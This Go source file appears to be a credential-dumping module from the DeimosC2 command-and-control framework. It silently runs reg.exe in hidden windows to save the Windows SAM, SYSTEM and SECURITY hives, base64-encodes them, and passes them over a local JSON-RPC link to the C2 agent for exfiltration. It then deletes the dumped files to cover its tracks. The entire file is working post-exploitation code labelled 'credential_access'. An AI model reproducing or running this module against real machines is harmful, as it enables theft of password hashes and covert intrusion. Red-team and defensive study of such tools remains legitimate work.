package main

import (
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"log"
	"net"
	"net/rpc/jsonrpc"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"syscall"
	"time"

	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/logging"
	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/modulescommon"
)

type downloadFiles struct {
	Samfile    string
	Samdata    string
	Systemfile string
	Systemdata string
	Secfile    string
	Secdata    string
}

func runModule(port string) {

	//Hardcoded and needs to be fixed long term along with other modules
	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("Dialing:", err)
	}
	defer conn.Close()

	client := jsonrpc.NewClient(conn)

	cmdName := "cmd.exe"

	samFile := path.Join("C:", "Windows", "samfile")
	systemFile := path.Join("C:", "Windows", "systemfile")
	securityFile := path.Join("C:", "Windows", "securityfile")

	cmdArgs := []string{"/c", "reg.exe save HKLM\\SAM " + samFile}
	cmd := exec.Command(cmdName, cmdArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	cmdArgs2 := []string{"/c", "reg.exe save HKLM\\SYSTEM " + systemFile}
	cmd2 := exec.Command(cmdName, cmdArgs2...)
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd2.Run()

	cmdArgs3 := []string{"/c", "reg.exe save HKLM\\SECURITY " + securityFile}
	cmd3 := exec.Command(cmdName, cmdArgs3...)
	cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd3.Run()

	samData, err := ioutil.ReadFile(samFile)
	if err != nil {
		logging.Logger.Println(err)
	}

	systemData, err := ioutil.ReadFile(systemFile)
	if err != nil {
		logging.Logger.Println(err)
	}

	securityData, err := ioutil.ReadFile(securityFile)
	if err != nil {
		logging.Logger.Println(err)
	}

	downloadStruct := downloadFiles{
		Samfile:    filepath.Base(samFile),
		Samdata:    base64.StdEncoding.EncodeToString(samData),
		Systemfile: filepath.Base(systemFile),
		Systemdata: base64.StdEncoding.EncodeToString(systemData),
		Secfile:    filepath.Base(securityFile),
		Secdata:    base64.StdEncoding.EncodeToString(securityData),
	}

	sendData, err := json.Marshal(downloadStruct)

	var reply int
	sendon := modulescommon.ModuleCom{"", true, false, false, "samdump", "credential_access", ".exe", sendData}
	err = client.Call("ModData.SendData", &sendon, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

	time.Sleep(3 * time.Second)

	err = os.Remove(samFile)
	if err != nil {
		log.Fatal("Problem Deleteting File:", err)
	}

	err = os.Remove(systemFile)
	if err != nil {
		log.Fatal("Problem Deleteting File:", err)
	}

	err = os.Remove(securityFile)
	if err != nil {
		log.Fatal("Problem Deleteting File:", err)
	}

	//Once all the data hase been sent then we will tell the server to close the other half of the module
	sendon = modulescommon.ModuleCom{"", true, false, true, "samdump", "credential_access", ".exe", nil}

	err = client.Call("ModData.SendData", &sendon, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}
}

func main() {
	runModule(os.Args[1])
}
